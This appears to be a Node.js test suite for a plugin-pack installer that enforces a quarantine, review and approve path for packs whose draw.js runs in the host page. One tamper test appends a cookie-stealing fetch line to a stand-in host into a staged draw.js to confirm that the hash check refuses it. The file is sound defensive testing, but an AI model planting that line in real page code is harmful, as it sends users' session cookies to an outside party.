// B1's consent for element types (annotation engine tranche 2, U322;
// DECISIONS.md B1 review-approve, readiness R7 row 5, F10 C-7).
//
// An element type's draw.js runs in the surface page's own realm (X-4: a
// pane-style script reaches every chrome capability there), so a pack that
// ships one installs ONLY through quarantine → review → approve. The two
// direct entry points — `pack install <url>` and POST /api/packs/install,
// which any pane can reach and cannot be told from a click — refuse it with
// the reviewed path in the refusal, and write nothing. The review lists each
// type with its draw.js; a draw.js changed after the review is refused by the
// staged tree's hash; approve installs. Which path an install came by (`via`)
// is set only in process: no route body, query or CLI flag reaches it, and
// 'builtin' installs only web-chat's own built-in pack.

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

const { packFixture, tmpDir, write, fakeForge, repoWithArchive } = require('../test-support/packs');
const { withServer, withTempHome } = require('../test-support/helpers');
const { projectPaths, userPaths } = require('../lib/core/paths');
const { BUILTIN_ELEMENT_PACK, BUILTIN_ELEMENT_TYPE_NAMES } = require('../lib/core/names');
const { listPacks, findPack, readAudit } = require('../lib/packs/store');
const { verifyPack } = require('../lib/packs/tree');
const packs = require('../lib/packs/install');

const SHA = 'a'.repeat(40);
const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8"/>\n';
const DRAW = "export default function draw(el, ctx) { ctx.box(el).textContent = 'sticky'; }\n";

function elementFiles(type, { draw = DRAW, json = {} } = {}) {
  const body = { type, family: 'page', remote: { see: 'read', send: 'full' }, schema: `${type}@1`, reads: [`${type}@1`], anchors: ['element', 'range'], ...json };
  return {
    [`elements/${type}/element.json`]: JSON.stringify(body, null, 2) + '\n',
    ...(draw != null ? { [`elements/${type}/draw.js`]: draw } : {}),
    [`elements/${type}/assets/icon.svg`]: SVG,
  };
}

function elementPack({ name = 'mark-pack', types = ['sticky'], components = [], draw, json } = {}) {
  let extraFiles = {};
  for (const t of types) extraFiles = { ...extraFiles, ...elementFiles(t, { draw, json }) };
  return packFixture({
    name, version: '1.0.0', components, skill: false,
    manifest: {
      name, version: '1.0.0', description: 'Sticky notes on the surface.',
      ...(components.length ? { components: components.map((c) => c.name) } : {}),
      elements: types,
    },
    extraFiles,
  });
}

function project(t) {
  withTempHome(t);
  const root = tmpDir('wc-elc-proj-');
  fs.mkdirSync(path.join(root, '.web-chat'), { recursive: true });
  return root;
}

// Every file under the project (records and the staging/audit area left out)
// and under the user tier's element-types — what an install could have
// written.
function written(root) {
  const out = {};
  const skip = [projectPaths(root).packsDir, projectPaths(root).packs];
  const walk = (base, tag) => {
    (function go(dir) {
      let ents;
      try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
      for (const e of ents) {
        const abs = path.join(dir, e.name);
        if (skip.includes(abs)) continue;
        const rel = `${tag}/${path.relative(base, abs).split(path.sep).join('/')}`;
        if (e.isDirectory()) { out[`${rel}/`] = 'dir'; go(abs); } else out[rel] = crypto.createHash('sha256').update(fs.readFileSync(abs)).digest('hex');
      }
    })(base);
  };
  walk(root, 'proj');
  walk(userPaths().elementTypesDir, 'home/element-types');
  return out;
}

const HINT = (url, name) => `claude-web-chat pack get ${url}, then claude-web-chat pack review ${name} and claude-web-chat pack approve ${name} — or ＋ → Manage → Download for review`;

// ── the direct entry points ─────────────────────────────────────────────────
test('installPack refuses a pack that ships an element type, names the reviewed path and writes nothing', async (t) => {
  const root = project(t);
  const forge = await fakeForge(t, { repos: { 'acme/marks': repoWithArchive(elementPack({ components: [{ name: 'sticky-board' }] }), { sha: SHA }) } });
  const url = forge.url('acme', 'marks');
  const before = written(root);
  let err = null;
  try { await packs.installPack({ url, root }); } catch (e) { err = e; }
  assert.ok(err && err.userFacing, 'refused');
  assert.equal(err.code, 'element-review');
  assert.equal(err.hint, HINT(url, 'mark-pack'));
  assert.match(err.message, /^"mark-pack" ships element type \(sticky\)\. An element type's draw\.js runs in the surface page's own realm, so a pack that ships one installs only after a review — nothing was installed\./);
  assert.ok(err.message.includes(HINT(url, 'mark-pack')));
  assert.deepStrictEqual(written(root), before, '0 files written — the component beside it does not land either');
  assert.deepStrictEqual(listPacks(root), []);
  assert.equal(readAudit(root).at(-1), undefined, 'refused before the transaction: no install line');
  // Both tiers.
  await assert.rejects(packs.installPack({ url, root, tier: 'system' }), /installs only after a review/);
  assert.deepStrictEqual(written(root), before);
});

test('a pack with no element type still installs directly (the refusal is B1\'s, nothing wider)', async (t) => {
  const root = project(t);
  const forge = await fakeForge(t, { repos: { 'acme/ops': repoWithArchive(packFixture({ components: [{ name: 'deploy-board' }] }), { sha: SHA }) } });
  const out = await packs.installPack({ url: forge.url('acme', 'ops'), root });
  assert.equal(out.ok, true);
  assert.equal(out.pack.elements, undefined, 'a record without element types keeps its 0.8.5 shape');
});

test('POST /api/packs/install refuses an element pack with the reviewed-path hint, and {via:"builtin"} in the body changes nothing', async (t) => {
  await withServer(t, async ({ api, root }) => {
    const forge = await fakeForge(t, { repos: { 'acme/marks': repoWithArchive(elementPack(), { sha: SHA }) } });
    const url = forge.url('acme', 'marks');
    const before = written(root);
    for (const body of [{ url }, { url, via: 'builtin' }, { url, via: 'approve' }, { url, builtin: true, global: true }]) {
      const r = await api.post('/api/packs/install', body);
      assert.equal(r.status, 200, 'a refusal is not a transport failure');
      assert.equal(r.json.ok, false, JSON.stringify(body));
      assert.equal(r.json.rejected, true);
      assert.match(r.json.hint, /installs only after a review/);
      assert.ok(r.json.hint.includes(HINT(url, 'mark-pack')), r.json.hint);
    }
    // A query string reaches nothing either.
    const q = await api.post('/api/packs/install?via=builtin', { url });
    assert.equal(q.json.ok, false);
    assert.deepStrictEqual(written(root), before, '0 files written');
    // The daemon's boot installed the built-in pack (U323); nothing else.
    assert.deepStrictEqual(listPacks(root).map((p) => p.name), [BUILTIN_ELEMENT_PACK]);
  });
});

// The CLI, spawned the way test/pack-cli.test.js does: the fake forge is an
// HTTP server in THIS process, so the child must not block it.
function runCli(args, { home, cwd }) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [path.join(__dirname, '..', 'bin', 'claude-web-chat.js'), ...args], {
      cwd,
      env: { ...process.env, HOME: home, USERPROFILE: home, WEB_CHAT_NO_GH: '1' },
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (d) => { stdout += d; });
    child.stderr.on('data', (d) => { stderr += d; });
    child.on('close', (status) => resolve({ status, stdout, stderr }));
  });
}

test('`pack install <url>` refuses an element pack, and `--via builtin` / `--via=builtin` are no way round it', async (t) => {
  const home = tmpDir('wc-elc-home-');
  const proj = tmpDir('wc-elc-proj-');
  fs.mkdirSync(path.join(proj, '.web-chat'), { recursive: true });
  const forge = await fakeForge(t, { repos: { 'acme/marks': repoWithArchive(elementPack(), { sha: SHA }) } });
  const url = forge.url('acme', 'marks');
  for (const extra of [[], ['--via', 'builtin'], ['--via=builtin'], ['--via=approve']]) {
    const r = await runCli(['pack', 'install', url, '--yes', ...extra], { home, cwd: proj });
    assert.equal(r.status, 1, `${extra.join(' ')}: ${r.stdout}${r.stderr}`);
    assert.match(r.stderr, /"mark-pack" ships element type \(sticky\)/);
    assert.ok(r.stderr.includes(HINT(url, 'mark-pack')), r.stderr);
    assert.equal(fs.existsSync(projectPaths(proj).elementTypesDir), false, `${extra.join(' ')}: nothing installed`);
    assert.equal(fs.existsSync(path.join(home, '.web-chat', 'element-types')), false);
  }
  assert.equal(fs.existsSync(projectPaths(proj).packs), false, 'no record');
});

test('`via` is not reachable from the routes or the CLI: neither calls installFromStage or passes a via', () => {
  for (const rel of ['lib/server/routes/packs.js', 'lib/cli/commands/pack.js']) {
    const src = fs.readFileSync(path.join(__dirname, '..', rel), 'utf8');
    assert.doesNotMatch(src, /installFromStage/, `${rel} reaches the pipeline only through installPack / approvePack`);
    assert.doesNotMatch(src, /\bvia\s*:/, `${rel} never passes a via`);
  }
  // And the two entry points set theirs in place.
  const install = fs.readFileSync(path.join(__dirname, '..', 'lib', 'packs', 'install.js'), 'utf8');
  assert.match(install, /async function installPack\(\{ url, ref = null, asset = null, tier = 'local', root, replace = false, actor = 'cli', log = \(\) => \{\} \} = \{\}\)/,
    'installPack takes no via');
  assert.match(install, /function approvePack\(\{ name, root, tier = null, replace = false, actor = 'cli', log = \(\) => \{\} \} = \{\}\)/,
    'approvePack takes no via');
});

// ── the reviewed path ───────────────────────────────────────────────────────
test('quarantine → review lists each type with its schema, reads, anchors and draw.js; approve installs it', async (t) => {
  const root = project(t);
  const forge = await fakeForge(t, { repos: { 'acme/marks': repoWithArchive(elementPack({ types: ['sticky', 'flag'] }), { sha: SHA }) } });
  const { record } = await packs.quarantinePack({ url: forge.url('acme', 'marks'), root });
  assert.equal(fs.existsSync(projectPaths(root).elementTypesDir), false, 'quarantine installs nothing');
  assert.deepStrictEqual(record.errors, []);
  assert.deepStrictEqual(record.elements, [
    { name: 'sticky', schema: 'sticky@1', reads: ['sticky@1'], anchors: ['element', 'range'], draw: 'draw.js', files: ['element.json', 'draw.js', 'assets/icon.svg'] },
    { name: 'flag', schema: 'flag@1', reads: ['flag@1'], anchors: ['element', 'range'], draw: 'draw.js', files: ['element.json', 'draw.js', 'assets/icon.svg'] },
  ]);
  const r = packs.reviewQuarantine({ name: 'mark-pack', root });
  assert.deepStrictEqual(r.record.elements, record.elements);
  assert.deepStrictEqual(r.manifest.elements.map((e) => e.name), ['sticky', 'flag']);
  assert.deepStrictEqual(r.plan.units.filter((u) => u.kind === 'element').map((u) => u.name), ['sticky', 'flag']);
  assert.ok(r.tree.some((f) => f.path === 'elements/sticky/draw.js'), 'draw.js is in the reviewed file tree');
  assert.equal(packs.reviewQuarantine({ name: 'mark-pack', root, file: 'elements/sticky/draw.js' }).text, DRAW, 'and readable before deciding');

  const out = packs.approvePack({ name: 'mark-pack', root });
  assert.equal(out.ok, true);
  const found = findPack(root, 'mark-pack', 'local');
  assert.deepStrictEqual(found.pack.elements, ['sticky', 'flag']);
  assert.equal(verifyPack(found.pack, { root, tier: 'local' }).drift, false);
  assert.equal(fs.readFileSync(path.join(projectPaths(root).elementTypesDir, 'sticky', 'draw.js'), 'utf8'), DRAW);
  assert.equal(readAudit(root).at(-1).op, 'approve');
});

test('a draw.js changed after the review is refused by the staged tree\'s hash, and nothing lands', async (t) => {
  const root = project(t);
  const forge = await fakeForge(t, { repos: { 'acme/marks': repoWithArchive(elementPack(), { sha: SHA }) } });
  const { record } = await packs.quarantinePack({ url: forge.url('acme', 'marks'), root });
  packs.reviewQuarantine({ name: 'mark-pack', root });
  fs.appendFileSync(path.join(record.pack_dir, 'elements', 'sticky', 'draw.js'), 'fetch("https://example.invalid/" + document.cookie);\n');
  const before = written(root);
  assert.throws(() => packs.approvePack({ name: 'mark-pack', root }), /no longer matches what was downloaded/);
  assert.deepStrictEqual(written(root), before);
  assert.equal(fs.existsSync(projectPaths(root).elementTypesDir), false);
  assert.deepStrictEqual(listPacks(root), []);
});

test('the review route carries the element types too; the approve route refuses them (K.4) and the card\'s control installs them', async (t) => {
  await withServer(t, async ({ srv, api, root }) => {
    const forge = await fakeForge(t, { repos: { 'acme/marks': repoWithArchive(elementPack(), { sha: SHA }) } });
    let r = await api.post('/api/packs/quarantine', { url: forge.url('acme', 'marks') });
    assert.equal(r.json.ok, true);
    r = await api.get('/api/packs/quarantine/mark-pack/review');
    assert.equal(r.json.ok, true);
    assert.deepStrictEqual(r.json.record.elements.map((e) => [e.name, e.draw]), [['sticky', 'draw.js']]);
    r = await api.get('/api/packs');
    assert.deepStrictEqual(r.json.quarantined[0].elements.map((e) => e.name), ['sticky']);
    // U322a (K.4): any pane can reach this route, so an element pack is a
    // person's to approve — through the card's confirm frame (the control row).
    r = await api.post('/api/packs/quarantine/mark-pack/approve', {});
    assert.equal(r.status, 409);
    assert.equal(r.json.code, 'element-approve', JSON.stringify(r.json));
    assert.equal(fs.existsSync(path.join(projectPaths(root).elementTypesDir, 'sticky')), false, 'nothing installed by the route');
    await srv.controlStarted;
    const a = await srv.control.invoke('pack-approve', { name: 'mark-pack', tier: 'local' }, { remote: false });
    assert.equal(a.ok, true, JSON.stringify(a));
    assert.ok(fs.existsSync(path.join(projectPaths(root).elementTypesDir, 'sticky', 'draw.js')));
    r = await api.get('/api/packs');
    assert.deepStrictEqual(r.json.packs.find((p) => p.name === 'mark-pack').elements, ['sticky']);
  });
});

// ── the built-in pack ───────────────────────────────────────────────────────
// The built-in types install as web-chat's own first pack, from the daemon in
// process (U323's boot step): via 'builtin', for BUILTIN_ELEMENT_PACK alone,
// carrying the reserved names and no draw.js. These pin the seam U323 uses.
function builtinPack({ name = BUILTIN_ELEMENT_PACK } = {}) {
  let extraFiles = {};
  for (const t of BUILTIN_ELEMENT_TYPE_NAMES) extraFiles = { ...extraFiles, ...elementFiles(t, { draw: null }) };
  return packFixture({
    name, version: '1.0.0', components: [], skill: false,
    manifest: { name, version: '1.0.0', description: 'web-chat\'s built-in element types.', elements: [...BUILTIN_ELEMENT_TYPE_NAMES] },
    extraFiles,
  });
}

test('via \'builtin\' installs the built-in pack (reserved names, no draw.js), and only that pack', (t) => {
  const root = project(t);
  const out = packs.installFromStage({ stageDir: builtinPack(), source: { via: 'builtin' }, tier: 'local', root, via: 'builtin' });
  assert.equal(out.ok, true);
  assert.deepStrictEqual(out.pack.elements, [...BUILTIN_ELEMENT_TYPE_NAMES]);
  for (const type of BUILTIN_ELEMENT_TYPE_NAMES) {
    assert.ok(fs.existsSync(path.join(projectPaths(root).elementTypesDir, type, 'element.json')), type);
    assert.equal(fs.existsSync(path.join(projectPaths(root).elementTypesDir, type, 'draw.js')), false, 'a built-in\'s draw code is the chrome\'s');
  }

  const other = elementPack({ name: 'not-builtins' });
  assert.throws(() => packs.installFromStage({ stageDir: other, source: {}, tier: 'local', root, via: 'builtin' }),
    /only web-chat's own built-in element pack \("web-chat-builtins"\) installs as built-in — "not-builtins" refused/);
});

test('the built-in pack\'s name and its type names are refused to every other path, in either tier, with no override', async (t) => {
  const root = project(t);
  const stage = builtinPack();
  for (const via of ['approve', 'install']) {
    for (const tier of ['local', 'system']) {
      const before = written(root);
      assert.throws(() => packs.installFromStage({ stageDir: stage, source: {}, tier, root, replace: true, via }),
        /"web-chat-builtins" is the name of web-chat's own built-in element pack\. Refused; there is no override — rename the pack\./);
      assert.deepStrictEqual(written(root), before, `${via}/${tier}: 0 files`);
    }
  }
  // A third-party pack that ships a built-in type under its own name.
  const shadow = elementPack({ name: 'shadow-pack', types: ['comment'] });
  for (const tier of ['local', 'system']) {
    assert.throws(() => packs.installFromStage({ stageDir: shadow, source: {}, tier, root, replace: true, via: 'approve' }),
      /element "comment" is a built-in element type name/);
  }
  assert.equal(fs.existsSync(projectPaths(root).elementTypesDir), false);
  assert.equal(fs.existsSync(userPaths().elementTypesDir), false);
});
